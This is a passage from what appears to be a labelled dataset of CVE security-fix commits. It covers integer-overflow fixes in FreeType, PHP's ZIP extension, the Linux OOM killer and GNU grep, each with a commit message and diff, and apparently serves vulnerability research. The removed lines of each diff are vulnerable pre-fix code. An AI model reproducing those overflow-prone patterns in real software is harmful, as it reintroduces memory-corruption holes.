a\/src\/smooth\/ftsmooth.c\n+++ b\/src\/smooth\/ftsmooth.c\n@@ -4,7 +4,7 @@\n \/*                                                                         *\/\n \/*    Anti-aliasing renderer interface (body).                             *\/\n \/*                                                                         *\/\n-\/*  Copyright 2000-2001, 2002, 2003, 2004, 2005, 2006, 2009 by             *\/\n+\/*  Copyright 2000-2001, 2002, 2003, 2004, 2005, 2006, 2009, 2010 by       *\/\n \/*  David Turner, Robert Wilhelm, and Werner Lemberg.                      *\/\n \/*                                                                         *\/\n \/*  This file is part of the FreeType project, and may only be used,       *\/\n@@ -200,7 +200,7 @@\n \n     \/* Required check is ( pitch * height < FT_ULONG_MAX ),     *\/\n     \/* but we care realistic cases only. Always pitch <= width. *\/\n-    if ( width > 0xFFFFU || height > 0xFFFFU )\n+    if ( width > 0x7FFFU || height > 0x7FFFU )\n     {\n       FT_ERROR(( \"ft_smooth_render_generic: glyph too large: %d x %d\\n\",\n                  width, height ));\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-2331","CWE_ID":"189","category":"security","commit_id":"ef8fc4b53d92fbfcd8ef1abbd6f2f5fe2c4a11e5","commit_message":"From ef8fc4b53d92fbfcd8ef1abbd6f2f5fe2c4a11e5 Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Tue, 17 Mar 2015 21:59:56 -0700\nSubject: [PATCH] Fix bug #69253 - ZIP Integer Overflow leads to writing past\n heap boundary\n\n---\n NEWS                     | 4 ++++\n ext\/zip\/lib\/zip_dirent.c | 2 +-\n 2 files changed, 5 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex 06857cc..0ce25d0 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -15,6 +15,10 @@ PHP                                                                        NEWS\n   . Fixed bug #69085 (SoapClient's __call() type confusion through\n     unserialize()). (Dmitry)\n \n+- ZIP:\n+  . Fixed bug #69253 (ZIP Integer Overflow leads to writing past heap\n+    boundary). (Stas)\n+\n 19 Feb 2015 PHP 5.4.38\n \n - Core:\ndiff --git a\/ext\/zip\/lib\/zip_dirent.c b\/ext\/zip\/lib\/zip_dirent.c\nindex b9dac5c..0090801 100644\n--- a\/ext\/zip\/lib\/zip_dirent.c\n+++ b\/ext\/zip\/lib\/zip_dirent.c\n@@ -101,7 +101,7 @@ _zip_cdir_new(int nentry, struct zip_error *error)\n \treturn NULL;\n     }\n \n-    if ((cd->entry=(struct zip_dirent *)malloc(sizeof(*(cd->entry))*nentry))\n+    if ( nentry > ((size_t)-1)\/sizeof(*(cd->entry)) || (cd->entry=(struct zip_dirent *)malloc(sizeof(*(cd->entry))*(size_t)nentry))\n \t== NULL) {\n \t_zip_error_set(error, ZIP_ER_MEMORY, 0);\n \tfree(cd);\n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-4097","CWE_ID":"189","category":"security","commit_id":"56c6a8a4aadca809e04276eabe5552935c51387f","commit_message":"From 56c6a8a4aadca809e04276eabe5552935c51387f Mon Sep 17 00:00:00 2001\nFrom: Frantisek Hrbata <fhrbata@redhat.com>\nDate: Mon, 19 Dec 2011 17:11:59 -0800\nSubject: [PATCH] oom: fix integer overflow of points in oom_badness\n\ncommit ff05b6f7ae762b6eb464183eec994b28ea09f6dd upstream.\n\nAn integer overflow will happen on 64bit archs if task's sum of rss,\nswapents and nr_ptes exceeds (2^31)\/1000 value.  This was introduced by\ncommit\n\nf755a04 oom: use pte pages in OOM score\n\nwhere the oom score computation was divided into several steps and it's no\nlonger computed as one expression in unsigned long(rss, swapents, nr_pte\nare unsigned long), where the result value assigned to points(int) is in\nrange(1..1000).  So there could be an int overflow while computing\n\n176          points *= 1000;\n\nand points may have negative value. Meaning the oom score for a mem hog task\nwill be one.\n\n196          if (points <= 0)\n197                  return 1;\n\nFor example:\n[ 3366]     0  3366 35390480 24303939   5       0             0 oom01\nOut of memory: Kill process 3366 (oom01) score 1 or sacrifice child\n\nHere the oom1 process consumes more than 24303939(rss)*4096~=92GB physical\nmemory, but it's oom score is one.\n\nIn this situation the mem hog task is skipped and oom killer kills another and\nmost probably innocent task with oom score greater than one.\n\nThe points variable should be of type long instead of int to prevent the\nint overflow.\n\nSigned-off-by: Frantisek Hrbata <fhrbata@redhat.com>\nAcked-by: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>\nAcked-by: Oleg Nesterov <oleg@redhat.com>\nAcked-by: David Rientjes <rientjes@google.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@suse.de>\n---\n mm\/oom_kill.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/mm\/oom_kill.c b\/mm\/oom_kill.c\nindex 626303b52f3ce..e9a17857a203d 100644\n--- a\/mm\/oom_kill.c\n+++ b\/mm\/oom_kill.c\n@@ -162,7 +162,7 @@ static bool oom_unkillable_task(struct task_struct *p,\n unsigned int oom_badness(struct task_struct *p, struct mem_cgroup *mem,\n \t\t      const nodemask_t *nodemask, unsigned long totalpages)\n {\n-\tint points;\n+\tlong points;\n \n \tif (oom_unkillable_task(p, mem, nodemask))\n \t\treturn 0;\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-5667","CWE_ID":"189","category":"security","commit_id":"cbbc1a45b9f843c811905c97c90a5d31f8e6c189","commit_message":"From cbbc1a45b9f843c811905c97c90a5d31f8e6c189 Mon Sep 17 00:00:00 2001\nFrom: Paul Eggert <eggert@cs.ucla.edu>\nDate: Wed, 29 Feb 2012 00:41:00 -0800\nSubject: grep: fix some core dumps with long lines etc.\n\nThese problems mostly occur because the code attempts to stuff\nsizes into int or into unsigned int; this doesn't work on most\n64-bit hosts and the errors can lead to core dumps.\n* NEWS: Document this.\n* src\/dfa.c (token): Typedef to ptrdiff_t, since the enum's\nrange could be as small as -128 .. 127 on practical hosts.\n(position.index): Now size_t, not unsigned int.\n(leaf_set.elems): Now size_t *, not unsigned int *.\n(dfa_state.hash, struct mb_char_classes.nchars, .nch_classes)\n(.nranges, .nequivs, .ncoll_elems, struct dfa.cindex, .calloc, .tindex)\n(.talloc, .depth, .nleaves, .nregexps, .nmultibyte_prop, .nmbcsets):\n(.mbcsets_alloc): Now size_t, not int.\n(dfa_state.first_end): Now token, not int.\n(state_num): New type.\n(struct mb_char_classes.cset): Now ptrdiff_t, not int.\n(struct dfa.utf8_anychar_classes): Now token[5], not int[5].\n(struct dfa.sindex, .salloc, .tralloc): Now state_num, not int.\n(struct dfa.trans, .realtrans, .fails): Now state_num **, not int **.\n(struct dfa.newlines): Now state_num *, not int *.\n(prtok): Don't assume 'token' is no wider than int.\n(lexleft, parens, depth): Now size_t, not int.\n(charclass_index, nsubtoks)\n(parse_bracket_exp, addtok, copytoks, closure, insert, merge, delete)\n(state_index, epsclosure, state_separate_contexts)\n(dfaanalyze, dfastate, build_state, realloc_trans_if_necessary)\n(transit_state_singlebyte, match_anychar, match_mb_charset)\n(check_matching_with_multibyte_ops, transit_state_consume_1char)\n(transit_state, dfaexec, free_mbdata, dfaoptimize, dfafree)\n(freelist, enlist, addlists, inboth, dfamust):\nDon't assume indexes fit in 'int'.\n(lex): Avoid overflow in string-to-{hi,lo} conversions.\n(dfaanalyze): Redo indexing so that it works with size_t values,\nwhich cannot go negative.\n* src\/dfa.h (dfaexec): Count argument is now size_t *, not int *.\n(dfastate): State numbers are now ptrdiff_t, not int.\n* src\/dfasearch.c: Include \"intprops.h\", for TYPE_MAXIMUM.\n(kwset_exact_matches): Now size_t, not int.\n(EGexecute): Don't assume indexes fit in 'int'.\nCheck for overflow before converting a ptrdiff_t to a regoff_t,\nas regoff_t is narrower than ptrdiff_t in 64-bit glibc (contra POSIX).\nCheck for memory exhaustion in re_search rather than treating\nit merely as failure to match; use xalloc_die () to report any error.\n* src\/kwset.c (struct trie.accepting): Now size_t, not unsigned int.\n(struct kwset.words): Now ptrdiff_t, not int.\n* src\/kwset.h (struct kwsmatch.index): Now size_t, not int.\n---\n NEWS            |   7 ++\n src\/dfa.c       | 270 +++++++++++++++++++++++++++++++-------------------------\n src\/dfa.h       |   4 +-\n src\/dfasearch.c |  31 +++++--\n src\/kwset.c     |   4 +-\n src\/kwset.h     |   2 +-\n tests\/big-match |   0\n 7 files changed, 187 insertions(+), 131 deletions(-)\n mode change 100644 => 100755 tests\/big-match\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex f895ed4..47e0ca4 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -4,6 +4,13 @@ GNU grep NEWS                                    -*- outline -*-\n \n ** Bug fixes\n \n+  grep no longer dumps core on lines whose lengths do not fit in 'int'.\n+  (e.g., lines longer than 2 GiB on a typical 64-bit host).\n+  Instead, grep either works as expected, or reports an error.\n+  An error can occur if not enough main memory is available, or if the\n+  GNU C library's regular expression functions cannot handle such long lines.\n+  [bug present since \"the beginning\"]\n+\n   grep no longer silently suppresses errors when reading a directory\n   as if it were a text file.  For example, \"grep x .\" now reports a\n   read error on most systems; formerly, it ignored the error.\ndiff --git a\/src\/dfa.c b\/src\/dfa.c\nindex f3e414d..4c9071f 100644\n--- a\/src\/dfa.c\n+++ b\/src\/dfa.c\n@@ -157,7 +157,11 @@ static inline unsigned char to_uchar (char ch) { return ch; }\n \/* The regexp is parsed into an array of tokens in postfix form.  Some tokens\n    are operators and others are terminal symbols.  Most (but not all) of these\n    codes are returned by the lexical analyzer. *\/\n-typedef enum\n+\n+typedef ptrdiff_t token;\n+\n+\/* Predefined token values.  *\/\n+enum\n {\n   END = -1,\t\t\t\/* END is a terminal symbol that matches the\n                                    end of input; any value of END or less in\n@@ -243,7 +247,7 @@ typedef enum\n   CSET\t\t\t\t\/* CSET and (and any value greater) is a\n                                    terminal symbol that matches any of a\n                                    class of characters. *\/\n-} token;\n+};\n \n \n \/* States of the recognizer correspond to sets of positions in the parse\n@@ -252,7 +256,7 @@ typedef enum\n    a constraint. *\/\n typedef struct\n {\n-  unsigned int index;\t\t\/* Index into the parse array. *\/\n+  size_t index;\t\t\t\/* Index into the parse array. *\/\n   unsigned int constraint;\t\/* Constraint for matching this position. *\/\n } position;\n \n@@ -267,7 +271,7 @@ typedef struct\n \/* Sets of leaves are also stored as arrays. *\/\n typedef struct\n {\n-  unsigned int *elems;\t\t\/* Elements of this position set. *\/\n+  size_t *elems;\t\t\/* Elements of this position set. *\/\n   size_t nelem;\t\t\t\/* Number of elements in this set. *\/\n } leaf_set;\n \n@@ -276,35 +280,39 @@ typedef struct\n    contains an END token. *\/\n typedef struct\n {\n-  int hash;\t\t\t\/* Hash of the positions of this state. *\/\n+  size_t hash;\t\t\t\/* Hash of the positions of this state. *\/\n   position_set elems;\t\t\/* Positions this state could match. *\/\n   unsigned char context;\t\/* Context from previous state. *\/\n   char backref;\t\t\t\/* True if this state matches a \\<digit>.  *\/\n   unsigned short constraint;\t\/* Constraint for this state to accept. *\/\n-  int first_end;\t\t\/* Token value of the first END in elems. *\/\n+  token first_end;\t\t\/* Token value of the first END in elems. *\/\n   position_set mbps;           \/* Positions which can match multibyte\n                                   characters.  e.g. period.\n                                   These staff are used only if\n                                   MB_CUR_MAX > 1.  *\/\n } dfa_state;\n \n+\/* States are indexed by state_num values.  These are normally\n+   nonnegative but -1 is used as a special value.  *\/\n+typedef ptrdiff_t state_num;\n+\n \/* A bracket operator.\n    e.g. [a-c], [[:alpha:]], etc.  *\/\n struct mb_char_classes\n {\n-  int cset;\n+  ptrdiff_t cset;\n   int invert;\n   wchar_t *chars;\t\t\/* Normal characters.  *\/\n-  int nchars;\n+  size_t nchars;\n   wctype_t *ch_classes;\t\t\/* Character classes.  *\/\n-  int nch_classes;\n+  size_t nch_classes;\n   wchar_t *range_sts;\t\t\/* Range characters (start of the range).  *\/\n   wchar_t *range_ends;\t\t\/* Range characters (end of the range).  *\/\n-  int nranges;\n+  size_t nranges;\n   char **equivs;\t\t\/* Equivalent classes.  *\/\n-  int nequivs;\n+  size_t nequivs;\n   char **coll_elems;\n-  int ncoll_elems;\t\t\/* Collating elements.  *\/\n+  size_t ncoll_elems;\t\t\/* Collating elements.  *\/\n };\n \n \/* A compiled regular expression. *\/\n@@ -312,21 +320,21 @@ struct dfa\n {\n   \/* Fields filled by the scanner. *\/\n   charclass *charclasses;\t\/* Array of character sets for CSET tokens. *\/\n-  int cindex;\t\t\t\/* Index for adding new charclasses. *\/\n-  int calloc;\t\t\t\/* Number of charclasses currently allocated. *\/\n+  size_t cindex;\t\t\/* Index for adding new charclasses. *\/\n+  size_t calloc;\t\t\/* Number of charclasses currently allocated. *\/\n \n   \/* Fields filled by the parser. *\/\n   token *tokens;\t\t\/* Postfix parse array. *\/\n-  int tindex;\t\t\t\/* Index for adding new tokens. *\/\n-  int talloc;\t\t\t\/* Number of tokens currently allocated. *\/\n-  int depth;\t\t\t\/* Depth required of an evaluation stack\n+  size_t tindex;\t\t\/* Index for adding new tokens. *\/\n+  size_t talloc;\t\t\/* Number of tokens currently allocated. *\/\n+  size_t depth;\t\t\t\/* Depth required of an evaluation stack\n                                    used for depth-first traversal of the\n                                    parse tree. *\/\n-  int nleaves;\t\t\t\/* Number of leaves on the parse tree. *\/\n-  int nregexps;\t\t\t\/* Count of parallel regexps being built\n+  size_t nleaves;\t\t\/* Number of leaves on the parse tree. *\/\n+  size_t nregexps;\t\t\/* Count of parallel regexps being built\n                                    with dfaparse(). *\/\n   unsigned int mb_cur_max;\t\/* Cached value of MB_CUR_MAX.  *\/\n-  int utf8_anychar_classes[5];\t\/* To lower ANYCHAR in UTF-8 locales.  *\/\n+  token utf8_anychar_classes[5]; \/* To lower ANYCHAR in UTF-8 locales.  *\/\n \n   \/* The following are used only if MB_CUR_MAX > 1.  *\/\n \n@@ -347,18 +355,18 @@ struct dfa\n      multibyte_prop\n         = 3     , 1               ,  0              ,  2              , 3\n   *\/\n-  int nmultibyte_prop;\n+  size_t nmultibyte_prop;\n   int *multibyte_prop;\n \n   \/* Array of the bracket expression in the DFA.  *\/\n   struct mb_char_classes *mbcsets;\n-  int nmbcsets;\n-  int mbcsets_alloc;\n+  size_t nmbcsets;\n+  size_t mbcsets_alloc;\n \n   \/* Fields filled by the state builder. *\/\n   dfa_state *states;\t\t\/* States of the dfa. *\/\n-  int sindex;\t\t\t\/* Index for adding new states. *\/\n-  int salloc;\t\t\t\/* Number of states currently allocated. *\/\n+  state_num sindex;\t\t\/* Index for adding new states. *\/\n+  state_num salloc;\t\t\/* Number of states currently allocated. *\/\n \n   \/* Fields filled by the parse tree->NFA conversion. *\/\n   position_set *follows;\t\/* Array of follow sets, indexed by position\n@@ -377,22 +385,22 @@ struct dfa\n                                    beginning of the buffer. *\/\n \n   \/* Fields filled by dfaexec. *\/\n-  int tralloc;\t\t\t\/* Number of transition tables that have\n+  state_num tralloc;\t\t\/* Number of transition tables that have\n                                    slots so far. *\/\n   int trcount;\t\t\t\/* Number of transition tables that have\n                                    actually been built. *\/\n-  int **trans;\t\t\t\/* Transition tables for states that can\n+  state_num **trans;\t\t\/* Transition tables for states that can\n                                    never accept.  If the transitions for a\n                                    state have not yet been computed, or the\n                                    state could possibly accept, its entry in\n                                    this table is NULL. *\/\n-  int **realtrans;\t\t\/* Trans always points to realtrans + 1; this\n+  state_num **realtrans;\t\/* Trans always points to realtrans + 1; this\n                                    is so trans[-1] can contain NULL. *\/\n-  int **fails;\t\t\t\/* Transition tables after failing to accept\n+  state_num **fails;\t\t\/* Transition tables after failing to accept\n                                    on a state that potentially could do so. *\/\n   int *success;\t\t\t\/* Table of acceptance conditions used in\n                                    dfaexec and computed in build_state. *\/\n-  int *newlines;\t\t\/* Transitions on newlines.  The entry for a\n+  state_num *newlines;\t\t\/* Transitions on newlines.  The entry for a\n                                    newline in any transition table is always\n                                    -1 so we can count lines without wasting\n                                    too many cycles.  The transition for a\n@@ -462,7 +470,10 @@ prtok (token t)\n   if (t < 0)\n     fprintf(stderr, \"END\");\n   else if (t < NOTCHAR)\n-    fprintf(stderr, \"%c\", t);\n+    {\n+      int ch = t;\n+      fprintf(stderr, \"%c\", ch);\n+    }\n   else\n     {\n       switch (t)\n@@ -542,10 +553,10 @@ equal (charclass const s1, charclass const s2)\n static struct dfa *dfa;\n \n \/* Find the index of charclass s in dfa->charclasses, or allocate a new charclass. *\/\n-static int\n+static size_t\n charclass_index (charclass const s)\n {\n-  int i;\n+  size_t i;\n \n   for (i = 0; i < dfa->cindex; ++i)\n     if (equal(s, dfa->charclasses[i]))\n@@ -721,11 +732,11 @@ using_utf8 (void)\n    meaning of the @#%!@#%^!@ syntax bits. *\/\n \n static char const *lexptr;\t\/* Pointer to next input character. *\/\n-static int lexleft;\t\t\/* Number of characters remaining. *\/\n+static size_t lexleft;\t\t\/* Number of characters remaining. *\/\n static token lasttok;\t\t\/* Previous token returned; initially END. *\/\n static int laststart;\t\t\/* True if we're separated from beginning or (, |\n                                    only by zero-width characters. *\/\n-static int parens;\t\t\/* Count of outstanding left parens. *\/\n+static size_t parens;\t\t\/* Count of outstanding left parens. *\/\n static int minrep, maxrep;\t\/* Repeat counts for {m,n}. *\/\n static int hard_LC_COLLATE;\t\/* Nonzero if LC_COLLATE is hard.  *\/\n \n@@ -872,7 +883,7 @@ parse_bracket_exp (void)\n \n   \/* Work area to build a mb_char_classes.  *\/\n   struct mb_char_classes *work_mbc;\n-  int chars_al, range_sts_al, range_ends_al, ch_classes_al,\n+  size_t chars_al, range_sts_al, range_ends_al, ch_classes_al,\n     equivs_al, coll_elems_al;\n \n   chars_al = 0;\n@@ -1291,14 +1302,32 @@ lex (void)\n               char const *p = lexptr;\n               char const *lim = p + lexleft;\n               for (;  p != lim && ISASCIIDIGIT (*p);  p++)\n-                lo = (lo < 0 ? 0 : lo * 10) + *p - '0';\n+                {\n+                  if (lo < 0)\n+                    lo = *p - '0';\n+                  else\n+                    {\n+                      lo = lo * 10 + *p - '0';\n+                      if (RE_DUP_MAX < lo)\n+                        goto normal_char;\n+                    }\n+                }\n               if (p != lim && *p == ',')\n                 while (++p != lim && ISASCIIDIGIT (*p))\n-                  hi = (hi < 0 ? 0 : hi * 10) + *p - '0';\n+                  {\n+                    if (hi < 0)\n+                      hi = *p - '0';\n+                    else\n+                      {\n+                        hi = hi * 10 + *p - '0';\n+                        if (RE_DUP_MAX < hi)\n+                          goto normal_char;\n+                      }\n+                  }\n               else\n                 hi = lo;\n               if (p == lim || *p != '}'\n-                  || lo < 0 || RE_DUP_MAX < hi || (0 <= hi && hi < lo))\n+                  || lo < 0 || (0 <= hi && hi < lo))\n                 goto normal_char;\n             }\n \n@@ -1464,7 +1493,7 @@ lex (void)\n \/* Recursive descent parser for regular expressions. *\/\n \n static token tok;\t\t\/* Lookahead token. *\/\n-static int depth;\t\t\/* Current depth of a hypothetical stack\n+static size_t depth;\t\t\/* Current depth of a hypothetical stack\n                                    holding deferred productions.  This is\n                                    used to determine the depth that will be\n                                    required of the real stack later on in\n@@ -1521,7 +1550,7 @@ addtok (token t)\n          This does not require UTF-8.  *\/\n       if (!work_mbc->invert)\n         {\n-          int i;\n+          size_t i;\n           for (i = 0; i < work_mbc->nchars; i++)\n             {\n               addtok_wc (work_mbc->chars[i]);\n@@ -1738,10 +1767,10 @@ atom (void)\n }\n \n \/* Return the number of tokens in the given subexpression. *\/\n-static int _GL_ATTRIBUTE_PURE\n-nsubtoks (int tindex)\n+static size_t _GL_ATTRIBUTE_PURE\n+nsubtoks (size_t tindex)\n {\n-  int ntoks1;\n+  size_t ntoks1;\n \n   switch (dfa->tokens[tindex - 1])\n     {\n@@ -1760,9 +1789,9 @@ nsubtoks (int tindex)\n \n \/* Copy the given subexpression to the top of the tree. *\/\n static void\n-copytoks (int tindex, int ntokens)\n+copytoks (size_t tindex, size_t ntokens)\n {\n-  int i;\n+  size_t i;\n \n   for (i = 0; i < ntokens; ++i)\n     {\n@@ -1776,7 +1805,8 @@ copytoks (int tindex, int ntokens)\n static void\n closure (void)\n {\n-  int tindex, ntokens, i;\n+  int i;\n+  size_t tindex, ntokens;\n \n   atom();\n   while (tok == QMARK || tok == STAR || tok == PLUS || tok == REPMN)\n@@ -1904,12 +1934,12 @@ alloc_position_set (position_set *s, size_t size)\n static void\n insert (position p, position_set *s)\n {\n-  int count = s->nelem;\n-  int lo = 0, hi = count;\n-  int i;\n+  size_t count = s->nelem;\n+  size_t lo = 0, hi = count;\n+  size_t i;\n   while (lo < hi)\n     {\n-      int mid = ((unsigned) lo + (unsigned) hi) >> 1;\n+      size_t mid = (lo + hi) >> 1;\n       if (s->elems[mid].index > p.index)\n         lo = mid + 1;\n       else\n@@ -1934,7 +1964,7 @@ insert (position p, position_set *s)\n static void\n merge (position_set const *s1, position_set const *s2, position_set *m)\n {\n-  int i = 0, j = 0;\n+  size_t i = 0, j = 0;\n \n   REALLOC_IF_NECESSARY(m->elems, m->alloc, s1->nelem + s2->nelem);\n   m->nelem = 0;\n@@ -1958,7 +1988,7 @@ merge (position_set const *s1, position_set const *s2, position_set *m)\n static void\n delete (position p, position_set *s)\n {\n-  int i;\n+  size_t i;\n \n   for (i = 0; i < s->nelem; ++i)\n     if (p.index == s->elems[i].index)\n@@ -1971,12 +2001,12 @@ delete (position p, position_set *s)\n \/* Find the index of the state corresponding to the given position set with\n    the given preceding context, or create a new state if there is no such\n    state.  Context tells whether we got here on a newline or letter. *\/\n-static int\n+static state_num\n state_index (struct dfa *d, position_set const *s, int context)\n {\n-  int hash = 0;\n+  size_t hash = 0;\n   int constraint;\n-  int i, j;\n+  state_num i, j;\n \n   for (i = 0; i < s->nelem; ++i)\n     hash ^= s->elems[i].index + s->elems[i].constraint;\n@@ -2038,7 +2068,7 @@ state_index (struct dfa *d, position_set const *s, int context)\n static void\n epsclosure (position_set *s, struct dfa const *d)\n {\n-  int i, j;\n+  size_t i, j;\n   char *visited;\t\/* array of booleans, enough to use char, not int *\/\n   position p, old;\n \n@@ -2130,7 +2160,7 @@ static int _GL_ATTRIBUTE_PURE\n state_separate_contexts (position_set const *s)\n {\n   int separate_contexts = 0;\n-  unsigned int j;\n+  size_t j;\n \n   for (j = 0; j < s->nelem; ++j)\n     {\n@@ -2200,24 +2230,24 @@ void\n dfaanalyze (struct dfa *d, int searchflag)\n {\n   int *nullable;\t\t\/* Nullable stack. *\/\n-  int *nfirstpos;\t\t\/* Element count stack for firstpos sets. *\/\n+  size_t *nfirstpos;\t\t\/* Element count stack for firstpos sets. *\/\n   position *firstpos;\t\t\/* Array where firstpos elements are stored. *\/\n-  int *nlastpos;\t\t\/* Element count stack for lastpos sets. *\/\n+  size_t *nlastpos;\t\t\/* Element count stack for lastpos sets. *\/\n   position *lastpos;\t\t\/* Array where lastpos elements are stored. *\/\n   position_set tmp;\t\t\/* Temporary set for merging sets. *\/\n   position_set merged;\t\t\/* Result of merging sets. *\/\n   int separate_contexts;\t\/* Context wanted by some position. *\/\n   int *o_nullable;\n-  int *o_nfirst, *o_nlast;\n+  size_t *o_nfirst, *o_nlast;\n   position *o_firstpos, *o_lastpos;\n-  int i, j;\n+  size_t i, j;\n   position *pos;\n \n #ifdef DEBUG\n   fprintf(stderr, \"dfaanalyze:\\n\");\n   for (i = 0; i < d->tindex; ++i)\n     {\n-      fprintf(stderr, \" %d:\", i);\n+      fprintf(stderr, \" %zd:\", i);\n       prtok(d->tokens[i]);\n     }\n   putc('\\n', stderr);\n@@ -2297,7 +2327,7 @@ dfaanalyze (struct dfa *d, int searchflag)\n         else\n           {\n             pos = lastpos + nlastpos[-2];\n-            for (j = nlastpos[-1] - 1; j >= 0; --j)\n+            for (j = nlastpos[-1]; j-- > 0; )\n               pos[j] = lastpos[j];\n             lastpos += nlastpos[-2];\n             nlastpos[-2] = nlastpos[-1];\n@@ -2343,20 +2373,20 @@ dfaanalyze (struct dfa *d, int searchflag)\n       }\n #ifdef DEBUG\n     \/* ... balance the above nonsyntactic #ifdef goo... *\/\n-      fprintf(stderr, \"node %d:\", i);\n+      fprintf(stderr, \"node %zd:\", i);\n       prtok(d->tokens[i]);\n       putc('\\n', stderr);\n       fprintf(stderr, nullable[-1] ? \" nullable: yes\\n\" : \" nullable: no\\n\");\n       fprintf(stderr, \" firstpos:\");\n-      for (j = nfirstpos[-1] - 1; j >= 0; --j)\n+      for (j = nfirstpos[-1]; j-- > 0; )\n         {\n-          fprintf(stderr, \" %d:\", firstpos[j].index);\n+          fprintf(stderr, \" %zd:\", firstpos[j].index);\n           prtok(d->tokens[firstpos[j].index]);\n         }\n       fprintf(stderr, \"\\n lastpos:\");\n-      for (j = nlastpos[-1] - 1; j >= 0; --j)\n+      for (j = nlastpos[-1]; j-- > 0; )\n         {\n-          fprintf(stderr, \" %d:\", lastpos[j].index);\n+          fprintf(stderr, \" %zd:\", lastpos[j].index);\n           prtok(d->tokens[lastpos[j].index]);\n         }\n       putc('\\n', stderr);\n@@ -2374,12 +2404,12 @@ dfaanalyze (struct dfa *d, int searchflag)\n         || d->tokens[i] >= CSET)\n       {\n #ifdef DEBUG\n-        fprintf(stderr, \"follows(%d:\", i);\n+        fprintf(stderr, \"follows(%zd:\", i);\n         prtok(d->tokens[i]);\n         fprintf(stderr, \"):\");\n-        for (j = d->follows[i].nelem - 1; j >= 0; --j)\n+        for (j = d->follows[i].nelem; j-- > 0; )\n           {\n-            fprintf(stderr, \" %d:\", d->follows[i].elems[j].index);\n+            fprintf(stderr, \" %zd:\", d->follows[i].elems[j].index);\n             prtok(d->tokens[d->follows[i].elems[j].index]);\n           }\n         putc('\\n', stderr);\n@@ -2447,11 +2477,11 @@ dfaanalyze (struct dfa *d, int searchflag)\n    create a new group labeled with the characters of C and insert this\n    position in that group. *\/\n void\n-dfastate (int s, struct dfa *d, int trans[])\n+dfastate (state_num s, struct dfa *d, state_num trans[])\n {\n   leaf_set *grps;\t\t\/* As many as will ever be needed. *\/\n   charclass *labels;\t\t\/* Labels corresponding to the groups. *\/\n-  int ngrps = 0;\t\t\/* Number of groups actually used. *\/\n+  size_t ngrps = 0;\t\t\/* Number of groups actually used. *\/\n   position pos;\t\t\t\/* Current position being considered. *\/\n   charclass matches;\t\t\/* Set of matching characters. *\/\n   int matchesf;\t\t\t\/* True if matches is nonempty. *\/\n@@ -2463,11 +2493,11 @@ dfastate (int s, struct dfa *d, int trans[])\n   position_set tmp;\t\t\/* Temporary space for merging sets. *\/\n   int possible_contexts;\t\/* Contexts that this group can match. *\/\n   int separate_contexts;\t\/* Context that new state wants to know. *\/\n-  int state;\t\t\t\/* New state. *\/\n-  int state_newline;\t\t\/* New state on a newline transition. *\/\n-  int state_letter;\t\t\/* New state on a letter transition. *\/\n+  state_num state;\t\t\/* New state. *\/\n+  state_num state_newline;\t\/* New state on a newline transition. *\/\n+  state_num state_letter;\t\/* New state on a letter transition. *\/\n   int next_isnt_1st_byte = 0;\t\/* Flag if we can't add state0.  *\/\n-  int i, j, k;\n+  size_t i, j, k;\n \n   MALLOC (grps, NOTCHAR);\n   MALLOC (labels, NOTCHAR);\n@@ -2712,10 +2742,10 @@ dfastate (int s, struct dfa *d, int trans[])\n    TODO: Improve this comment, get rid of the unnecessary redundancy. *\/\n \n static void\n-build_state (int s, struct dfa *d)\n+build_state (state_num s, struct dfa *d)\n {\n-  int *trans;\t\t\t\/* The new transition table. *\/\n-  int i;\n+  state_num *trans;\t\t\/* The new transition table. *\/\n+  state_num i;\n \n   \/* Set an upper limit on the number of transition tables that will ever\n      exist at once.  1024 is arbitrary.  The idea is that the frequently\n@@ -2752,7 +2782,7 @@ build_state (int s, struct dfa *d)\n   for (i = 0; i < NOTCHAR; ++i)\n     if (trans[i] >= d->tralloc)\n       {\n-        int oldalloc = d->tralloc;\n+        state_num oldalloc = d->tralloc;\n \n         while (trans[i] >= d->tralloc)\n           d->tralloc *= 2;\n@@ -2818,13 +2848,13 @@ build_state_zero (struct dfa *d)\n     }\n \n static void\n-realloc_trans_if_necessary(struct dfa *d, int new_state)\n+realloc_trans_if_necessary(struct dfa *d, state_num new_state)\n {\n   \/* Make sure that the trans and fail arrays are allocated large enough\n      to hold a pointer for the new state. *\/\n   if (new_state >= d->tralloc)\n     {\n-      int oldalloc = d->tralloc;\n+      state_num oldalloc = d->tralloc;\n \n       while (new_state >= d->tralloc)\n         d->tralloc *= 2;\n@@ -2855,11 +2885,11 @@ typedef enum\n    But state transition is done just once, otherwise matching succeed or\n    reach the end of the buffer.  *\/\n static status_transit_state\n-transit_state_singlebyte (struct dfa *d, int s, unsigned char const *p,\n-                                  int *next_state)\n+transit_state_singlebyte (struct dfa *d, state_num s, unsigned char const *p,\n+                          state_num *next_state)\n {\n-  int *t;\n-  int works = s;\n+  state_num *t;\n+  state_num works = s;\n \n   status_transit_state rval = TRANSIT_STATE_IN_PROGRESS;\n \n@@ -2899,7 +2929,7 @@ transit_state_singlebyte (struct dfa *d, int s, unsigned char const *p,\n    current position.  Return the length of the match, in bytes.\n    POS is the position of the \".\".  *\/\n static int\n-match_anychar (struct dfa *d, int s, position pos, int idx)\n+match_anychar (struct dfa *d, state_num s, position pos, size_t idx)\n {\n   int context;\n   wchar_t wc;\n@@ -2932,9 +2962,9 @@ match_anychar (struct dfa *d, int s, position pos, int idx)\n    Return the length of the match, in bytes.\n    POS is the position of the bracket expression.  *\/\n static int\n-match_mb_charset (struct dfa *d, int s, position pos, int idx)\n+match_mb_charset (struct dfa *d, state_num s, position pos, size_t idx)\n {\n-  int i;\n+  size_t i;\n   int match;\t\t\/* Flag which represent that matching 